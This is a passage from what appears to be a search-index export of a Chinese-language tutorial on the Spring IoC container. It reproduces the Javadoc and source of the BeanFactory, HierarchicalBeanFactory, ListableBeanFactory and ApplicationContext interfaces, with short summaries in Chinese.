Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @return whether this bean will always deliver independent instances\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 2.0.3\n     * @see #getBean\n     * @see #isSingleton\n     */\n    boolean isPrototype(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Check whether the bean with the given name matches the specified type.\n     * More specifically, check whether a {@link #getBean} call for the given name\n     * would return an object that is assignable to the specified target type.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @param typeToMatch the type to match against (as a {@code ResolvableType})\n     * @return {@code true} if the bean type matches,\n     * {@code false} if it doesn't match or cannot be determined yet\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 4.2\n     * @see #getBean\n     * @see #getType\n     */\n    boolean isTypeMatch(String name, ResolvableType typeToMatch) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Check whether the bean with the given name matches the specified type.\n     * More specifically, check whether a {@link #getBean} call for the given name\n     * would return an object that is assignable to the specified target type.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @param typeToMatch the type to match against (as a {@code Class})\n     * @return {@code true} if the bean type matches,\n     * {@code false} if it doesn't match or cannot be determined yet\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 2.0.1\n     * @see #getBean\n     * @see #getType\n     */\n    boolean isTypeMatch(String name, Class&lt;?&gt; typeToMatch) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Determine the type of the bean with the given name. More specifically,\n     * determine the type of object that {@link #getBean} would return for the given name.\n     * &lt;p&gt;For a {@link FactoryBean}, return the type of object that the FactoryBean creates,\n     * as exposed by {@link FactoryBean#getObjectType()}. This may lead to the initialization\n     * of a previously uninitialized {@code FactoryBean} (see {@link #getType(String, boolean)}).\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @return the type of the bean, or {@code null} if not determinable\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 1.1.2\n     * @see #getBean\n     * @see #isTypeMatch\n     */\n    @Nullable\n    Class&lt;?&gt; getType(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Determine the type of the bean with the given name. More specifically,\n     * determine the type of object that {@link #getBean} would return for the given name.\n     * &lt;p&gt;For a {@link FactoryBean}, return the type of object that the FactoryBean creates,\n     * as exposed by {@link FactoryBean#getObjectType()}. Depending on the\n     * {@code allowFactoryBeanInit} flag, this may lead to the initialization of a previously\n     * uninitialized {@code FactoryBean} if no early type information is available.\n     * &lt;p&gt;Translates aliases back to the corresponding canonical bean name.\n     * Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the name of the bean to query\n     * @param allowFactoryBeanInit whether a {@code FactoryBean} may get initialized\n     * just for the purpose of determining its object type\n     * @return the type of the bean, or {@code null} if not determinable\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 5.2\n     * @see #getBean\n     * @see #isTypeMatch\n     */\n    @Nullable\n    Class&lt;?&gt; getType(String name, boolean allowFactoryBeanInit) throws NoSuchBeanDefinitionException;\n\n    /**\n     * Return the aliases for the given bean name, if any.\n     * All of those aliases point to the same bean when used in a {@link #getBean} call.\n     * &lt;p&gt;If the given name is an alias, the corresponding original bean name\n     * and other aliases (if any) will be returned, with the original bean name\n     * being the first element in the array.\n     * &lt;p&gt;Will ask the parent factory if the bean cannot be found in this factory instance.\n     * @param name the bean name to check for aliases\n     * @return the aliases, or an empty array if none\n     * @see #getBean\n     */\n    String[] getAliases(String name);\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#beanfactory_1","title":"BeanFactory\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface BeanFactory {\n\n    /**\n     */\n    String FACTORY_BEAN_PREFIX = \"&amp;\";\n\n\n    /**\n     */\n    Object getBean(String name) throws BeansException;\n\n    /**\n     */\n    &lt;T&gt; T getBean(String name, Class&lt;T&gt; requiredType) throws BeansException;\n\n    /**\n     */\n    Object getBean(String name, Object... args) throws BeansException;\n\n    /**\n     */\n    &lt;T&gt; T getBean(Class&lt;T&gt; requiredType) throws BeansException;\n\n    /**\n     */\n    &lt;T&gt; T getBean(Class&lt;T&gt; requiredType, Object... args) throws BeansException;\n\n    /**\n     */\n    &lt;T&gt; ObjectProvider&lt;T&gt; getBeanProvider(Class&lt;T&gt; requiredType);\n\n    /**\n     */\n    &lt;T&gt; ObjectProvider&lt;T&gt; getBeanProvider(ResolvableType requiredType);\n\n    /**\n     */\n    boolean containsBean(String name);\n\n    /**\n     */\n    boolean isSingleton(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    boolean isPrototype(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    boolean isTypeMatch(String name, ResolvableType typeToMatch) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    boolean isTypeMatch(String name, Class&lt;?&gt; typeToMatch) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    @Nullable\n    Class&lt;?&gt; getType(String name) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    @Nullable\n    Class&lt;?&gt; getType(String name, boolean allowFactoryBeanInit) throws NoSuchBeanDefinitionException;\n\n    /**\n     */\n    String[] getAliases(String name);\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#12-hierarchicalbeanfactory","title":"1.2 HierarchicalBeanFactory\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_3","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2012 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.beans.factory;\n\nimport org.springframework.lang.Nullable;\n\n/**\n * Sub-interface implemented by bean factories that can be part\n * of a hierarchy.\n *\n * &lt;p&gt;The corresponding {@code setParentBeanFactory} method for bean\n * factories that allow setting the parent in a configurable\n * fashion can be found in the ConfigurableBeanFactory interface.\n *\n * @author Rod Johnson\n * @author Juergen Hoeller\n * @since 07.07.2003\n * @see org.springframework.beans.factory.config.ConfigurableBeanFactory#setParentBeanFactory\n */\npublic interface HierarchicalBeanFactory extends BeanFactory {\n\n    /**\n     * Return the parent bean factory, or {@code null} if there is none.\n     */\n    @Nullable\n    BeanFactory getParentBeanFactory();\n\n    /**\n     * Return whether the local bean factory contains a bean of the given name,\n     * ignoring beans defined in ancestor contexts.\n     * &lt;p&gt;This is an alternative to {@code containsBean}, ignoring a bean\n     * of the given name from an ancestor bean factory.\n     * @param name the name of the bean to query\n     * @return whether a bean with the given name is defined in the local factory\n     * @see BeanFactory#containsBean\n     */\n    boolean containsLocalBean(String name);\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#hierarchicalbeanfactory","title":"HierarchicalBeanFactory\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface HierarchicalBeanFactory extends BeanFactory {\n\n    /**\n     */\n    @Nullable\n    BeanFactory getParentBeanFactory();\n\n    /**\n     */\n    boolean containsLocalBean(String name);\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#13-listablebeanfactory","title":"1.3 ListableBeanFactory\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_4","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2019 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.beans.factory;\n\nimport java.lang.annotation.Annotation;\nimport java.util.Map;\n\nimport org.springframework.beans.BeansException;\nimport org.springframework.core.ResolvableType;\nimport org.springframework.lang.Nullable;\n\n/**\n * Extension of the {@link BeanFactory} interface to be implemented by bean factories\n * that can enumerate all their bean instances, rather than attempting bean lookup\n * by name one by one as requested by clients. BeanFactory implementations that\n * preload all their bean definitions (such as XML-based factories) may implement\n * this interface.\n *\n * &lt;p&gt;If this is a {@link HierarchicalBeanFactory}, the return values will &lt;i&gt;not&lt;/i&gt;\n * take any BeanFactory hierarchy into account, but will relate only to the beans\n * defined in the current factory. Use the {@link BeanFactoryUtils} helper class\n * to consider beans in ancestor factories too.\n *\n * &lt;p&gt;The methods in this interface will just respect bean definitions of this factory.\n * They will ignore any singleton beans that have been registered by other means like\n * {@link org.springframework.beans.factory.config.ConfigurableBeanFactory}'s\n * {@code registerSingleton} method, with the exception of\n * {@code getBeanNamesOfType} and {@code getBeansOfType} which will check\n * such manually registered singletons too. Of course, BeanFactory's {@code getBean}\n * does allow transparent access to such special beans as well. However, in typical\n * scenarios, all beans will be defined by external bean definitions anyway, so most\n * applications don't need to worry about this differentiation.\n *\n * &lt;p&gt;&lt;b&gt;NOTE:&lt;/b&gt; With the exception of {@code getBeanDefinitionCount}\n * and {@code containsBeanDefinition}, the methods in this interface\n * are not designed for frequent invocation. Implementations may be slow.\n *\n * @author Rod Johnson\n * @author Juergen Hoeller\n * @since 16 April 2001\n * @see HierarchicalBeanFactory\n * @see BeanFactoryUtils\n */\npublic interface ListableBeanFactory extends BeanFactory {\n\n    /**\n     * Check if this bean factory contains a bean definition with the given name.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in,\n     * and ignores any singleton beans that have been registered by\n     * other means than bean definitions.\n     * @param beanName the name of the bean to look for\n     * @return if this bean factory contains a bean definition with the given name\n     * @see #containsBean\n     */\n    boolean containsBeanDefinition(String beanName);\n\n    /**\n     * Return the number of beans defined in the factory.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in,\n     * and ignores any singleton beans that have been registered by\n     * other means than bean definitions.\n     * @return the number of beans defined in the factory\n     */\n    int getBeanDefinitionCount();\n\n    /**\n     * Return the names of all beans defined in this factory.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in,\n     * and ignores any singleton beans that have been registered by\n     * other means than bean definitions.\n     * @return the names of all beans defined in this factory,\n     * or an empty array if none defined\n     */\n    String[] getBeanDefinitionNames();\n\n    /**\n     * Return the names of beans matching the given type (including subclasses),\n     * judging from either bean definitions or the value of {@code getObjectType}\n     * in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans, which means that FactoryBeans\n     * will get initialized. If the object created by the FactoryBean doesn't match,\n     * the raw FactoryBean itself will be matched against the type.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beanNamesForTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;This version of {@code getBeanNamesForType} matches all kinds of beans,\n     * be it singletons, prototypes, or FactoryBeans. In most implementations, the\n     * result will be the same as for {@code getBeanNamesForType(type, true, true)}.\n     * &lt;p&gt;Bean names returned by this method should always return bean names &lt;i&gt;in the\n     * order of definition&lt;/i&gt; in the backend configuration, as far as possible.\n     * @param type the generically typed class or interface to match\n     * @return the names of beans (or objects created by FactoryBeans) matching\n     * the given object type (including subclasses), or an empty array if none\n     * @since 4.2\n     * @see #isTypeMatch(String, ResolvableType)\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beanNamesForTypeIncludingAncestors(ListableBeanFactory, ResolvableType)\n     */\n    String[] getBeanNamesForType(ResolvableType type);\n\n    /**\n     * Return the names of beans matching the given type (including subclasses),\n     * judging from either bean definitions or the value of {@code getObjectType}\n     * in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans if the \"allowEagerInit\" flag is set,\n     * which means that FactoryBeans will get initialized. If the object created by the\n     * FactoryBean doesn't match, the raw FactoryBean itself will be matched against the\n     * type. If \"allowEagerInit\" is not set, only raw FactoryBeans will be checked\n     * (which doesn't require initialization of each FactoryBean).\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beanNamesForTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;Bean names returned by this method should always return bean names &lt;i&gt;in the\n     * order of definition&lt;/i&gt; in the backend configuration, as far as possible.\n     * @param type the generically typed class or interface to match\n     * @param includeNonSingletons whether to include prototype or scoped beans too\n     * or just singletons (also applies to FactoryBeans)\n     * @param allowEagerInit whether to initialize &lt;i&gt;lazy-init singletons&lt;/i&gt; and\n     * &lt;i&gt;objects created by FactoryBeans&lt;/i&gt; (or by factory methods with a\n     * \"factory-bean\" reference) for the type check. Note that FactoryBeans need to be\n     * eagerly initialized to determine their type: So be aware that passing in \"true\"\n     * for this flag will initialize FactoryBeans and \"factory-bean\" references.\n     * @return the names of beans (or objects created by FactoryBeans) matching\n     * the given object type (including subclasses), or an empty array if none\n     * @since 5.2\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beanNamesForTypeIncludingAncestors(ListableBeanFactory, ResolvableType, boolean, boolean)\n     */\n    String[] getBeanNamesForType(ResolvableType type, boolean includeNonSingletons, boolean allowEagerInit);\n\n    /**\n     * Return the names of beans matching the given type (including subclasses),\n     * judging from either bean definitions or the value of {@code getObjectType}\n     * in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans, which means that FactoryBeans\n     * will get initialized. If the object created by the FactoryBean doesn't match,\n     * the raw FactoryBean itself will be matched against the type.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beanNamesForTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;This version of {@code getBeanNamesForType} matches all kinds of beans,\n     * be it singletons, prototypes, or FactoryBeans. In most implementations, the\n     * result will be the same as for {@code getBeanNamesForType(type, true, true)}.\n     * &lt;p&gt;Bean names returned by this method should always return bean names &lt;i&gt;in the\n     * order of definition&lt;/i&gt; in the backend configuration, as far as possible.\n     * @param type the class or interface to match, or {@code null} for all bean names\n     * @return the names of beans (or objects created by FactoryBeans) matching\n     * the given object type (including subclasses), or an empty array if none\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beanNamesForTypeIncludingAncestors(ListableBeanFactory, Class)\n     */\n    String[] getBeanNamesForType(@Nullable Class&lt;?&gt; type);\n\n    /**\n     * Return the names of beans matching the given type (including subclasses),\n     * judging from either bean definitions or the value of {@code getObjectType}\n     * in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans if the \"allowEagerInit\" flag is set,\n     * which means that FactoryBeans will get initialized. If the object created by the\n     * FactoryBean doesn't match, the raw FactoryBean itself will be matched against the\n     * type. If \"allowEagerInit\" is not set, only raw FactoryBeans will be checked\n     * (which doesn't require initialization of each FactoryBean).\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beanNamesForTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;Bean names returned by this method should always return bean names &lt;i&gt;in the\n     * order of definition&lt;/i&gt; in the backend configuration, as far as possible.\n     * @param type the class or interface to match, or {@code null} for all bean names\n     * @param includeNonSingletons whether to include prototype or scoped beans too\n     * or just singletons (also applies to FactoryBeans)\n     * @param allowEagerInit whether to initialize &lt;i&gt;lazy-init singletons&lt;/i&gt; and\n     * &lt;i&gt;objects created by FactoryBeans&lt;/i&gt; (or by factory methods with a\n     * \"factory-bean\" reference) for the type check. Note that FactoryBeans need to be\n     * eagerly initialized to determine their type: So be aware that passing in \"true\"\n     * for this flag will initialize FactoryBeans and \"factory-bean\" references.\n     * @return the names of beans (or objects created by FactoryBeans) matching\n     * the given object type (including subclasses), or an empty array if none\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beanNamesForTypeIncludingAncestors(ListableBeanFactory, Class, boolean, boolean)\n     */\n    String[] getBeanNamesForType(@Nullable Class&lt;?&gt; type, boolean includeNonSingletons, boolean allowEagerInit);\n\n    /**\n     * Return the bean instances that match the given object type (including\n     * subclasses), judging from either bean definitions or the value of\n     * {@code getObjectType} in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans, which means that FactoryBeans\n     * will get initialized. If the object created by the FactoryBean doesn't match,\n     * the raw FactoryBean itself will be matched against the type.\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beansOfTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;This version of getBeansOfType matches all kinds of beans, be it\n     * singletons, prototypes, or FactoryBeans. In most implementations, the\n     * result will be the same as for {@code getBeansOfType(type, true, true)}.\n     * &lt;p&gt;The Map returned by this method should always return bean names and\n     * corresponding bean instances &lt;i&gt;in the order of definition&lt;/i&gt; in the\n     * backend configuration, as far as possible.\n     * @param type the class or interface to match, or {@code null} for all concrete beans\n     * @return a Map with the matching beans, containing the bean names as\n     * keys and the corresponding bean instances as values\n     * @throws BeansException if a bean could not be created\n     * @since 1.1.2\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beansOfTypeIncludingAncestors(ListableBeanFactory, Class)\n     */\n    &lt;T&gt; Map&lt;String, T&gt; getBeansOfType(@Nullable Class&lt;T&gt; type) throws BeansException;\n\n    /**\n     * Return the bean instances that match the given object type (including\n     * subclasses), judging from either bean definitions or the value of\n     * {@code getObjectType} in the case of FactoryBeans.\n     * &lt;p&gt;&lt;b&gt;NOTE: This method introspects top-level beans only.&lt;/b&gt; It does &lt;i&gt;not&lt;/i&gt;\n     * check nested beans which might match the specified type as well.\n     * &lt;p&gt;Does consider objects created by FactoryBeans if the \"allowEagerInit\" flag is set,\n     * which means that FactoryBeans will get initialized. If the object created by the\n     * FactoryBean doesn't match, the raw FactoryBean itself will be matched against the\n     * type. If \"allowEagerInit\" is not set, only raw FactoryBeans will be checked\n     * (which doesn't require initialization of each FactoryBean).\n     * &lt;p&gt;Does not consider any hierarchy this factory may participate in.\n     * Use BeanFactoryUtils' {@code beansOfTypeIncludingAncestors}\n     * to include beans in ancestor factories too.\n     * &lt;p&gt;Note: Does &lt;i&gt;not&lt;/i&gt; ignore singleton beans that have been registered\n     * by other means than bean definitions.\n     * &lt;p&gt;The Map returned by this method should always return bean names and\n     * corresponding bean instances &lt;i&gt;in the order of definition&lt;/i&gt; in the\n     * backend configuration, as far as possible.\n     * @param type the class or interface to match, or {@code null} for all concrete beans\n     * @param includeNonSingletons whether to include prototype or scoped beans too\n     * or just singletons (also applies to FactoryBeans)\n     * @param allowEagerInit whether to initialize &lt;i&gt;lazy-init singletons&lt;/i&gt; and\n     * &lt;i&gt;objects created by FactoryBeans&lt;/i&gt; (or by factory methods with a\n     * \"factory-bean\" reference) for the type check. Note that FactoryBeans need to be\n     * eagerly initialized to determine their type: So be aware that passing in \"true\"\n     * for this flag will initialize FactoryBeans and \"factory-bean\" references.\n     * @return a Map with the matching beans, containing the bean names as\n     * keys and the corresponding bean instances as values\n     * @throws BeansException if a bean could not be created\n     * @see FactoryBean#getObjectType\n     * @see BeanFactoryUtils#beansOfTypeIncludingAncestors(ListableBeanFactory, Class, boolean, boolean)\n     */\n    &lt;T&gt; Map&lt;String, T&gt; getBeansOfType(@Nullable Class&lt;T&gt; type, boolean includeNonSingletons, boolean allowEagerInit)\n            throws BeansException;\n\n    /**\n     * Find all names of beans which are annotated with the supplied {@link Annotation}\n     * type, without creating corresponding bean instances yet.\n     * &lt;p&gt;Note that this method considers objects created by FactoryBeans, which means\n     * that FactoryBeans will get initialized in order to determine their object type.\n     * @param annotationType the type of annotation to look for\n     * (at class, interface or factory method level of the specified bean)\n     * @return the names of all matching beans\n     * @since 4.0\n     * @see #findAnnotationOnBean\n     */\n    String[] getBeanNamesForAnnotation(Class&lt;? extends Annotation&gt; annotationType);\n\n    /**\n     * Find all beans which are annotated with the supplied {@link Annotation} type,\n     * returning a Map of bean names with corresponding bean instances.\n     * &lt;p&gt;Note that this method considers objects created by FactoryBeans, which means\n     * that FactoryBeans will get initialized in order to determine their object type.\n     * @param annotationType the type of annotation to look for\n     * (at class, interface or factory method level of the specified bean)\n     * @return a Map with the matching beans, containing the bean names as\n     * keys and the corresponding bean instances as values\n     * @throws BeansException if a bean could not be created\n     * @since 3.0\n     * @see #findAnnotationOnBean\n     */\n    Map&lt;String, Object&gt; getBeansWithAnnotation(Class&lt;? extends Annotation&gt; annotationType) throws BeansException;\n\n    /**\n     * Find an {@link Annotation} of {@code annotationType} on the specified bean,\n     * traversing its interfaces and super classes if no annotation can be found on\n     * the given class itself, as well as checking the bean's factory method (if any).\n     * @param beanName the name of the bean to look for annotations on\n     * @param annotationType the type of annotation to look for\n     * (at class, interface or factory method level of the specified bean)\n     * @return the annotation of the given type if found, or {@code null} otherwise\n     * @throws NoSuchBeanDefinitionException if there is no bean with the given name\n     * @since 3.0\n     * @see #getBeanNamesForAnnotation\n     * @see #getBeansWithAnnotation\n     */\n    @Nullable\n    &lt;A extends Annotation&gt; A findAnnotationOnBean(String beanName, Class&lt;A&gt; annotationType)\n            throws NoSuchBeanDefinitionException;\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#listablebeanfactory","title":"ListableBeanFactory\u200b\u65b9\u6cd5\u200b\u5c5e\u6027\u200b\u6458\u8981","text":"Java<pre><code>public interface ListableBeanFactory extends BeanFactory {\n\n    /**\n     */\n    boolean containsBeanDefinition(String beanName);\n\n    /**\n     */\n    int getBeanDefinitionCount();\n\n    /**\n     */\n    String[] getBeanDefinitionNames();\n\n    /**\n     */\n    String[] getBeanNamesForType(ResolvableType type);\n\n    /**\n     */\n    String[] getBeanNamesForType(ResolvableType type, boolean includeNonSingletons, boolean allowEagerInit);\n\n    /**\n     */\n    String[] getBeanNamesForType(@Nullable Class&lt;?&gt; type);\n\n    /**\n     */\n    String[] getBeanNamesForType(@Nullable Class&lt;?&gt; type, boolean includeNonSingletons, boolean allowEagerInit);\n\n\n    &lt;T&gt; Map&lt;String, T&gt; getBeansOfType(@Nullable Class&lt;T&gt; type) throws BeansException;\n\n\n    &lt;T&gt; Map&lt;String, T&gt; getBeansOfType(@Nullable Class&lt;T&gt; type, boolean includeNonSingletons, boolean allowEagerInit)\n            throws BeansException;\n\n\n    String[] getBeanNamesForAnnotation(Class&lt;? extends Annotation&gt; annotationType);\n\n\n    Map&lt;String, Object&gt; getBeansWithAnnotation(Class&lt;? extends Annotation&gt; annotationType) throws BeansException;\n\n\n    @Nullable\n    &lt;A extends Annotation&gt; A findAnnotationOnBean(String beanName, Class&lt;A&gt; annotationType)\n            throws NoSuchBeanDefinitionException;\n\n}\n</code></pre>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#14-applicationcontext","title":"1.4 ApplicationContext\u200b\u63a5\u53e3","text":"","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#applicationcontext","title":"ApplicationContext\u200b\u63a5\u53e3\u200b\u89e3\u6790","text":"<ul> <li>\u200b\u76f8\u6bd4\u200b\u4e8e\u200bBeanFactory,ApplicationContext\u200b\u662f\u200b\u9ad8\u200b\u914d\u7248\u200b\u7684\u200bIoc\u200b\u5bb9\u5668\u200b\uff0c\u200b\u5176\u200b\u5728\u200bBeanFactory\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u7684\u200b\u6269\u5c55\u200b\u529f\u80fd\u200b</li> <li>ListableBeanFactory, HierarchicalBeanFactory\u200b\u90fd\u200b\u662f\u200bBeanFactory\u200b\u7684\u200b\u5b50\u200b\u63a5\u53e3\u200b\uff0cApplicationContext\u200b\u7ee7\u627f\u200b\u4e86\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u63a5\u53e3\u200b\uff0cApplicationContext\u200b\u8fdb\u4e00\u6b65\u200b\u6269\u5c55\u200b\u4e86\u200bBeanFactory\u200b\u63a5\u53e3\u200b\u7684\u200b\u529f\u80fd\u200b</li> <li>. . .</li> </ul>","tags":["Spring","IOC","BeanFactory","ApplicationContext"]},{"location":"2/4/#_5","title":"\u5b8c\u6574\u7248\u200b\u6e90\u7801\u200b\uff1a","text":"Java<pre><code>/*\n * Copyright 2002-2014 the original author or authors.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      https://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.springframework.context;\n\nimport org.springframework.beans.factory.HierarchicalBeanFactory;\nimport org.springframework.beans.factory.ListableBeanFactory;\nimport org.springframework.beans.factory.config.AutowireCapableBeanFactory;\nimport org.springframework.core.env.EnvironmentCapable;\nimport org.springframework.core.io.support.ResourcePatternResolver;\nimport org.springframework.lang.Nullable;\n\n/**\n * Central interface to provide configuration for an application.\n * This is read-only while the application is running, but may be\n * reloaded if the implementation supports this.\n *\n * &lt;p&gt;An ApplicationContext provides:\n * &lt;ul&gt;\n * &lt;li&gt;Bean factory methods for accessing application components.\n * Inherited from {@link org.springframework.beans.factory.ListableBeanFactory}.\n * &lt;li&gt;The ability to load file resources in a generic fashion.\n * Inherited from the {@link org.springframework.core.io.ResourceLoader} interface.\n * &lt;li&gt;The ability to publish events to registered listeners.\n * Inherited from the {@link ApplicationEventPublisher} interface.\n * &lt;li&gt;The ability to resolve messages, supporting internationalization.\n * Inherited from the {@link MessageSource} interface.\n * &lt;li&gt;Inheritance from a parent context. Definitions in a descendant context\n * will always take priority. This means, for example, that a single parent\n * context can be used by an entire web application, while each servlet has\n * its own child context that is independent of that of any other servlet.\n * &lt;/ul&gt;\n *\n * &lt;p&gt;In addition to standard {@link org.springframework.beans.factory.BeanFactory}\n * lifecycle capabilities, ApplicationContext implementations detect and invoke\n * {@link ApplicationContextAware} beans as well as {@link ResourceLoaderAware},\n * {@link ApplicationEventPublisherAware} and {@link MessageSourceAware} beans.\n *\n * @author Rod Johnson\n * @author Juergen Hoeller\n * @see ConfigurableApplicationContext\n * @see org.springframework.beans.factory.BeanFactory\n * @see org.springframework.core.io.ResourceLoader\n */\npublic interface ApplicationContext extends EnvironmentCapable, ListableBeanFactory, HierarchicalBeanFactory,\n        MessageSource, ApplicationEventPublisher, ResourcePatternResolver {\n\n    /**\n     * Return the unique id of this application context.\n     * @return the unique id of the context, or {@code null} if none\n     */\n    @Nullable\n    String getId();\n\n    /**\n     * Return a name for the deployed application that this context belongs to.\n     * @return a name for the deployed application, or the empty String by default\n     */\n    String getApplicationName();\n\n    /**\n     * Return a friendly name for this context.\n     * @return a display name for this context (never {@code null})\n     */\n    String getDisplayName();\n\n    /**\n     * Return the timestamp when this context was first loaded.\n     * @return the timestamp (ms) when this context was first loaded\n     */\n    long getStartupDate();\n\n    /**\n     * Return the parent context, or {@code null} if 